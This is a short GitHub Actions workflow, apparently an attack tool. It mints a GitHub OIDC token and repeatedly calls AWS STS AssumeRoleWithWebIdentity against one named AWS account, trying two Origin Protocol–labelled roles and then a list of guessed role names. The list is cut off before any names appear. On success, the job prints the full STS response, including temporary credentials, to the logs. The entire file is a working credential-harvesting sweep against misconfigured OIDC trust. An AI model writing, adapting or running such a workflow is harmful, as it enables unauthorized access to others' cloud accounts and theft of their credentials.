name: w13b10sweep
on: workflow_dispatch
permissions:
  id-token: write
  contents: read
jobs:
  sweep:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - name: mint and sweep
        run: |
          set +e
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "TOKEN_LEN=${#TOKEN}"
          python3 -c "import base64,json,sys; p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4); print('CLAIM', base64.urlsafe_b64decode(p).decode())" "$TOKEN"
          echo "=== KNOWN ROLES"
          for ROLE in talos-gha-OriginProtocol-origin-dollar talos-gha-OriginProtocol-arm-oeth; do
            RESP=$(curl -s -X POST https://sts.amazonaws.com/ -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" -d "RoleArn=arn:aws:iam::114563866192:role/$ROLE" -d "RoleSessionName=w13b10" --data-urlencode "WebIdentityToken=$TOKEN")
            echo "--- $ROLE"
            echo "$RESP" | head -c 600; echo
          done
          echo "=== SWEEP"
          while read -r ROLE; do
            [ -z "$ROLE" ] && continue
            RESP=$(curl -s -X POST https://sts.amazonaws.com/ -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" -d "RoleArn=arn:aws:iam::114563866192:role/$ROLE" -d "RoleSessionName=w13b10" --data-urlencode "WebIdentityToken=$TOKEN")
            if echo "$RESP" | grep -q "AssumeRoleWithWebIdentityResult"; then
              echo "HIT $ROLE"
              echo "$RESP"
            else
              echo "MISS $ROLE"
            fi
          done <<'ROLES'
